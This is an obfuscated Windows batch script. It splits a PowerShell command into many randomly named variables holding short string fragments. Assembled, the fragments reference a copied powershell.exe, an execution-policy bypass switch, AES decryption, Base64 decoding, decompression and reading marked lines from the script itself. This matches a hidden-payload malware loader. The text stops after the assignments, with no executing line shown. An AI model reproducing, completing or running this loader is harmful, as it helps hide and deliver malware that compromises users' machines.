@echo off
set "errsvdQtYp=do"
set "doDWzhwNun=rS"
set "FiRxfJiZMT=ll"
set "dmdYDRAcoe=po"
set "NPregQILtu=ws"
set "exzYQLYzIi=xe"
set "VZImBRNdCp=rs"
set "QiBdJOVOus=Po"
set "XYpOfnjXQX=nd"
set "ABmjSbgWXv=py"
set "bxhccUHCmm=\W"
set "slKhoYISXy=we"
set "KTeurCEEDB=\v"
set "QfRLqlBXDh=st"
set "wxTCfWnEuc=co"
set "XNRAeupQax=in"
set "SnpiSNilgR= /"
set "USgaSboYrt=0\"
set "kenpVPeHZX=Sy"
set "eLaBogfhZS=ow"
set "CNoyNayLFz=32"
set "sitgHgkfBx=1."
set "LExFGWPnIG=he"
set "oQOwoyKNqH=em"
set "XBySntXNpo=Wi"
set "INrIWRGtMu=y "
set "nGmkyffuDP=he"
set "NuwfkZcHJv=:\"
set "KHLiuKgPHZ=we"
set "ZynCyyLvIs=s\"
set "hcZFEfejKv=ll"
set "ajnWMiRCDS= C"
set "swaTxdEQxL=.e"
set "VcVwOIvrEG=cd"
set "OWycTrikoq= %~dp0"
set "VayjXrdWjb=rtS4"
set "lLygaJVrsj=$zGE"
set "kxrCKHKVZT=yste"
set "BmqWbUMJAF=tem."
set "mOMtugEOyu=n ''"
set "QDKZeyJDGT=7Yiv"
set "tUHAQyxDcY=trea"
set "zxtEteSomw=] -j"
set "XqoRDbkPUn=oryS"
set "rrQmdFJBSm=Stre"
set "xUWmCrlIXu=ZYYc"
set "aPcDGbjCty=.IO."
set "odoWYjWvvL=($ih"
set "RidJzDONEK=cjLH"
set "vtVaEMkahR=zGEj"
set "PPsDijJLgo=iron"
set "OjDhsyedMB=oint"
set "eZrjdxjNvb=raph"
set "AykzsuWiUO=mory"
set "ELzLPzFwMz=);$d"
set "VxBVVtWhin=();$"
set "fMhUSAEnkr=urit"
set "XasGVKyTHB=S46e"
set "UjnxyPYsKr=-ep "
set "mwQAlftaVq=pher"
set "QNTqLbkEmU=ring"
set "ivQLPDHDaO=Pr.T"
set "vjtCRAMTlg=em.I"
set "NGDEXAZeLl=G, 0"
set "emXbxiGqQN=[-1."
set "TJtfqcfefs=;$JI"
set "plCqOxAanP='[-1"
set "NXyECSLDpj=$wWk"
set "yByYzvwaAh=oL'["
set "GSFxknCItx=-joi"
set "EDYwPuHQHT=O = "
set "mzFhSnWtjv=rity"
set "LFkfuZkJDI=.Dis"
set "rOzxHnHnzL=daeR"
set "XWxMoTQBjG=k; }"
set "bmyNkuFZfZ=BC;$"
set "WPgIHCVWyi=ypto"
set "ESSJLPtdjp=Pr ="
set "nRHhVrlSzk=Conv"
set "EfcnorJCWJ=XrLp"
set "pRSHDTqOkc=ewLi"
set "refZxEeWay=-Obj"
set "uyrPwhXCGo=ress"
set "tISLBKJFtX=le  "
set "dUtNqzYxvn=..-1"
set "qgqwaDFrvo=$hcj"
set "sztsIusRru=rt]:"
set "xFDuEcsSDE=th('"
set "qEBHBpUccv=-joi"
set "sJcEHgXzFW=comp"
set "CoEToVmAqY=q.En"
set "stWtGAmLow=Pr);"
set "JDXNzFSyZU=ment"
set "zJsJfOoaFa=F'[-"
set "TPhBYXQped=join"
set "wuXuUmgZrp=brea"
set "SQrMwWkfOI=);$h"
set "WRutyTgLSU=G = "
set "YmMikhpgDA=6esa"
set "mXMhxpugct=vj0m"
set "SpzHPlcTqs=XrLp"
set "WwiSUHvCwB=sion"
set "zShnPiOVSE=::De"
set "ObGSSIPmBc=y]::"
set "XYJwxzZafW= if "
set "IWWmYUefpA=[Sys"
set "EUFQTTJdVw=yRp."
set "qGipqxZHPI=Obje"
set "FbqoRdNodJ=JIFm"
set "xpLSqiWhch=($ih"
set "wtFDNFwrkU=ateD"
set "blnPiMulpn=hcjL"
set "uMUkLOukpp=3HWs"
set "cXvontBuLX=ihyR"
set "ZgfFlCxyQw=ptog"
set "ElGcapGTMq=saBm"
set "PWfJHsllmT=:: '"
set "JITfyIYVah=[Env"
